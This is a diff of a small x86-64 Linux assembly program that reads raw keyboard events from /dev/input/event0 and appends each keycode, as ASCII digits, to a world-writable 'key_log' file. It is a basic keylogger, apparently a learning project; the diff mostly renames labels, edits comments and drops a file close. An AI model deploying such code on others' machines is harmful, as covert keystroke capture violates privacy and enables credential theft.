@@ -1,8 +1,8 @@
 %define INPUT_EVENT_SIZE 24 ; in octets
 
 section .data
-    event0_file_path db "/dev/input/event0"
     key_log db "key_log", 0
+    event0_file_path db "/dev/input/event0"
     fd dq 0
 
 section .bss
@@ -18,6 +18,7 @@ _start:
     mov rsi, 0
     mov rdx, 0
     syscall
+
     mov [fd], rax ; save file descriptor of event0
 
 reading_new_key:
@@ -35,7 +36,7 @@ reading_new_key:
     cmp eax, 1
     jne reading_new_key
 
-    ; get the keycode
+    ; get the keycode and convert it from bin to ASCII
     movzx rax, word [buffer + 18] ; code
     mov rbx, 10
     xor rdx, rdx
@@ -44,7 +45,7 @@ reading_new_key:
     add dl, '0'                     ; reste → ASCII
     mov [key_temp], al
     mov [key_temp+1], dl
-    
+
     ; if we want to display the key uncomment
     ; mov rax, 1
     ; mov rdi, 1
@@ -52,14 +53,15 @@ reading_new_key:
     ; mov rdx, 3
     ; syscall
 
-    jmp write_key_in_keylog
+    jmp write_key
 
-write_key_in_keylog:
+write_key:
     mov rax, 2 ; sys_open()
     mov rdi, key_log
     mov rsi, 2 | 64 | 1024 ; O_WRONLY | O_CREAT | O_APPEND
-    mov rdx, 0777o        ; Permissions
+    mov rdx, 0777o
     syscall
+    
     mov rbx, rax ; save fd of keylog
 
     mov rax, 1 ; sys_write()
@@ -75,12 +77,6 @@ write_key_in_keylog:
     jmp reading_new_key
 
 exit:
-    mov rax, 3 ; close
-    mov rdi, [fd]
-    syscall
-
     mov rax, 60
     xor rdi, rdi
     syscall
-
-; nasm -f elf64 read_event.asm ; ld read_event.o -o read_event ; ./read_event
